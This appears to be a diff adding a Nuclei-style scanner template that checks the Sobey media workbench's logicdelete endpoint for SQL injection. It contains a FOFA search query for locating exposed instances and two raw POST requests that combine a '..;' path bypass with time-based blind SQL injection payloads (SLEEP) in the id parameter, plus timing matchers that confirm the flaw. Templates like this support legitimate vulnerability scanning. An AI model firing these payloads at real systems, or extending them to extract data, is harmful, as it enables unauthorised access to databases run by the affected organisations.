@@ -1,0 +1,29 @@
+id: sobey-media-logicdelete-sqli
+info:
+  name: "索贝融媒体工作平台 logicdelete 接口 SQL 注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
+      索贝融媒体工作平台的/sobey-mchEditor/mch/WXArticleInt/logicdelete接口存在SQL注入漏洞。攻击者可通过注入恶意SQL负载，实现未经授权的数据访问或操作，可能导致数据库内容泄露或系统权限被篡夺。
+  tags: 索贝融媒体工作平台
+http:
+- raw:
+  - |
+    POST /sobey-mchEditor/js/..;/mch/WXArticleInt/logicdelete HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    siteCode=&id=1 AND (SELECT 2004 FROM (SELECT(SLEEP(5)))MDfc)&token=
+  - |
+    POST /sobey-mchEditor/js/..;/mch/WXArticleInt/logicdelete HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    siteCode=&id=1 AND (SELECT 2004 FROM (SELECT(SLEEP(8)))MDfc)&token=
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
